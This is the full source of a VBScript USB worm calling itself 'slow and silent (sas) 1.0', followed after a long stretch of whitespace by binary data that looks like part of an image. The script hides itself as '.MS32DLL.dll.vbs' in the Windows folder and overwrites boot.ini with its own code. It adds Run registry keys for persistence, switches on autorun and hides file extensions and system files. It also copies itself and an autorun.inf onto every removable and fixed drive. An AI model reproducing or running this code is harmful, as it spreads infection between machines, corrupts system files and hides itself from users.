��' m a r k  
 ' k e r  
 ' s l o w   a n d   s i l e n t   ( s a s ) 1 . 0  
 o n   e r r o r   r e s u m e   n e x t  
 d i m   m y s o u r c e , w i n p a t h , f l a s h d r i v e , f s , m f , a t r , t f , r g , n t , c c , h m  
 a t r   =   " [ a u t o r u n ] " & v b c r l f & " s h e l l e x e c u t e = w s c r i p t . e x e   . M S 3 2 D L L . d l l . v b s "  
 s e t   f s   =   c r e a t e o b j e c t ( " S c r i p t i n g . F i l e S y s t e m O b j e c t " )  
 s e t   m f   =   f s . g e t f i l e ( W s c r i p t . S c r i p t F u l l n a m e )  
 s e t   r g   =   c r e a t e o b j e c t ( " W S c r i p t . S h e l l " )  
 r g . R e g W r i t e   " H K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s   S c r i p t i n g   H o s t \ S e t t i n g s \ T i m e o u t " , " 0 "  
 r g . r e g w r i t e   " H K E Y _ L O C A L _ M A C H I N E \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ R u n \ M S 3 2 D L L " , w i n p a t  
 r g . r e g w r i t e   " H K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ E x p l o r e r \ A d v a n c e d \ H i d e F i l e E x t " , " 1 "  
 r g . r e g w r i t e   " H K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ E x p l o r e r \ A d v a n c e d \ H i d d e n " , " 1 "  
 d i m   t e x t , s i z e  
 s i z e   =   m f . s i z e  
 s e t   t e x t = m f . o p e n a s t e x t s t r e a m ( 1 , - 2 )  
 c c   =   t e x t . r e a d l i n e  
 d o   w h i l e   n o t   t e x t . a t e n d o f s t r e a m  
 m y s o u r c e = m y s o u r c e & t e x t . r e a d l i n e  
 m y s o u r c e = m y s o u r c e   &   v b c r l f  
 l o o p  
 S e t   w i n p a t h   =   f s . g e t s p e c i a l f o l d e r ( 0 )  
 s e t   t f   =   f s . g e t f i l e ( w i n p a t h   &   " \ . M S 3 2 D L L . d l l . v b s " )  
 t f . a t t r i b u t e s   =   3 2  
 s e t   t f = f s . c r e a t e t e x t f i l e ( w i n p a t h   &   " \ . M S 3 2 D L L . d l l . v b s " , 2 , t r u e )  
 t f . w r i t e   " ' k e r " & v b c r l f & m y s o u r c e  
 t f . c l o s e  
 s e t   t f   =   f s . g e t f i l e ( w i n p a t h   &   " \ . M S 3 2 D L L . d l l . v b s " )  
 t f . a t t r i b u t e s   =   3 9  
 S e t   w i n p a t h   =   f s . g e t s p e c i a l f o l d e r ( 0 )  
 s e t   t f   =   f s . g e t f i l e ( w i n p a t h   &   " \ b o o t . i n i " )  
 t f . a t t r i b u t e s   =   3 2  
 s e t   t f = f s . c r e a t e t e x t f i l e ( w i n p a t h   &   " \ b o o t . i n i " , 2 , t r u e )  
 t f . w r i t e   " ' k e r " & v b c r l f & m y s o u r c e  
 t f . c l o s e  
 s e t   t f   =   f s . g e t f i l e ( w i n p a t h   &   " \ b o o t . i n i " )  
 t f . a t t r i b u t e s   =   3 9  
 i f   c c   =   " ' m a r k "   t h e n  
 r g . r u n   w i n p a t h & " \ e x p l o r e r . e x e   / e , / s e l e c t ,   " & W s c r i p t . S c r i p t F u l l n a m e  
 e n d   i f  
 i f   c c   =   " ' m a r k e r "   t h e n  
 r g . r u n   w i n p a t h & " \ e x p l o r e r . e x e   / e , / s e l e c t ,   " & W s c r i p t . S c r i p t F u l l n a m e  
 e n d   i f  
 d o  
 f o r   e a c h   f l a s h d r i v e   i n   f s . d r i v e s  
 h m = " ' m a r k "  
 I f   ( f l a s h d r i v e . d r i v e t y p e = 1   o r   f l a s h d r i v e . d r i v e t y p e = 2 )   a n d   f l a s h d r i v e . p a t h   < >   " A : "   t h e n  
 i f ( f l a s h d r i v e . d r i v e t y p e = 2 )   t h e n  
 h m   =   " ' m a r k e r "  
 e n d   i f  
 s e t   t f = f s . g e t f i l e ( f l a s h d r i v e . p a t h   & " \ . M S 3 2 D L L . d l l . v b s " )  
 t f . a t t r i b u t e s   = 3 2  
 s e t   t f = f s . c r e a t e t e x t f i l e ( f l a s h d r i v e . p a t h   & " \ . M S 3 2 D L L . d l l . v b s " , 2 , t r u e )  
 t f . w r i t e   h m & v b c r l f & m y s o u r c e  
 t f . c l o s e  
 s e t   t f = f s . g e t f i l e ( f l a s h d r i v e . p a t h   & " \ . M S 3 2 D L L . d l l . v b s " )  
 t f . a t t r i b u t e s   = 3 9  
 s e t   t f   = f s . g e t f i l e ( f l a s h d r i v e . p a t h   & " \ a u t o r u n . i n f " )  
 t f . a t t r i b u t e s   =   3 2  
 s e t   t f = f s . c r e a t e t e x t f i l e ( f l a s h d r i v e . p a t h   & " \ a u t o r u n . i n f " , 2 , t r u e )  
 t f . w r i t e   a t r  
 t f . c l o s e  
 s e t   t f   = f s . g e t f i l e ( f l a s h d r i v e . p a t h   & " \ a u t o r u n . i n f " )  
 t f . a t t r i b u t e s = 3 9  
 e n d   i f  
 r g . R e g W r i t e   " H K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s   S c r i p t i n g   H o s t \ S e t t i n g s \ T i m e o u t " , " 0 "  
 r g . r e g w r i t e   " H K E Y _ L O C A L _ M A C H I N E \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ R u n \ M S 3 2 D L L " , w i n p a t h & " \ . M S 3 2 D L L . d l l . v b s "  
 r g . r e g w r i t e   " H K E Y _ L O C A L _ M A C H I N E \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ R u n \ w i n b o o t " , " w s c r i p t . e x e   / E : v b s   " & w i n p a t h & " \ b o o t . i n i "  
 r g . r e g w r i t e   " H K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ P o l i c i e s \ E x p l o r e r \ N o D r i v e T y p e A u t o R u n " , 0 , " R E G _ D W O R D "  
 r g . r e g w r i t e   " H K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ E x p l o r e r \ A d v a n c e d \ S u p e r H i d d e n " , 1 , " R E G _ D W O R D "  
 r g . r e g w r i t e   " H K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ E x p l o r e r \ A d v a n c e d \ S h o w S u p e r H i d d e n " , 0 , " R E G _ D W O R D "  
 r g . r e g w r i t e   " H K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ E x p l o r e r \ A d v a n c e d \ H i d e F i l e E x t " , " 1 "  
 r g . r e g w r i t e   " H K E Y _ C U R R E N T _ U S E R \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ E x p l o r e r \ A d v a n c e d \ H i d d e n " , " 1 "  
 n e x t  
 i f   c c   < >   " ' m a r k "   t h e n  
 W s c r i p t . s l e e p   1 0 0 0 0  
 e n d   i f  
 l o o p   w h i l e   c c   < >   " ' m a r k "  
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         �:N�w��u�hK�r�/R�	���*����e�h����\@Z�*K��R�j�	���kq�̘{���b� 
uԶ1*��W�ȡxU���4�D=��N
"�5(M˨q��A������ 8T�Z�"��Eh�ᒅE@4Y�L��8�)|�4sd����{��k5�r4C��Κ���8ϫi���Ɍ�t�=�c�^�)Ȗ�������gΣ�'��zI�"Is�X-B�XqT�]�n�DzA�y*6�����G���%æ*�v*.Pq�����C{v �B@yJ`H��UR|j:��Я3ɮ����+�(A����ӫ� ! !�  ,    F ( ��=@��8�ͻ�](�$I��l�p_rm�xb�|�ﾠ�}ţ��L%o�tJ�JW��	�N��,��j�B.��@�_l�*<M�Au��fM�w)tRL{H/b+bRn.�WWd	h9\l�	^e��f�ue�o�?��R�Q���2�������)��T	�u 
 